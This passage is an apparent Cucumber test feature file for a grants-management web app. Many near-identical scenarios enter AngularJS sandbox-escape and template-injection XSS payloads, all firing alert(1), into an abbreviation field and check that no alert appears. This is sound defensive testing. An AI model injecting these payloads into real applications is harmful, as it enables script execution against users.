      | {{c=''.sub.call;b=''.sub.bind;c.$apply=$apply;c.$eval=b;$root.$$phase=null;$root.$digest=$on; C=c.$apply(c);B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='alert(1)';astNode.argument={type:'Identifier'};");m1=$$asyncQueue.pop().expression;m2=B(C,null,m1);[].push.apply=m2;$eval('B(b)');}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301564 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                     | Field                |
      | {{constructor.constructor('alert(1)')()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301565 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                              | Field                |
      | {{$on.constructor('alert(1)')()}}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301566 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                 | Field                |
      | constructor.constructor('alert(1)')() | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301567 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                  | Field                |
      | a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')() | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301568 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                   | Field                |
      | toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor) | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301569 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                                                                                                                                                         | Field                |
      | {}[['__proto__']]['x']=constructor.getOwnPropertyDescriptor;g={}[['__proto__']]['x'];{}[['__proto__']]['y']=g(''.sub[['__proto__']],'constructor');{}[['__proto__']]['z']=constructor.defineProperty;d={}[['__proto__']]['z'];d(''.sub[['__proto__']],'constructor',{value:false});{}[['__proto__']]['y'].value('alert(1)')() | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301570 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                | Field                |
      | {}.")));alert(1)//"; | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301572 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value              | Field                |
      | {testData:script3} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301575 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value              | Field                |
      | {testData:script4} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301576 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                 | Field                |
      | constructor.constructor('alert(1)')() | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301577 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value              | Field                |
      | {testData:script5} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301580 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value              | Field                |
      | {testData:script6} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301582 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    And I enter value "<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>" into field "fieldAbbreviation__c"
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301585 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value              | Field                |
      | {testData:script7} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301587 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                          | Field                |
      | <div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301589 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    And I enter value "<input ng-cut=$event.composedPath()|orderBy:'(y=alert)(1)'>" into field "fieldAbbreviation__c"
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301590 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
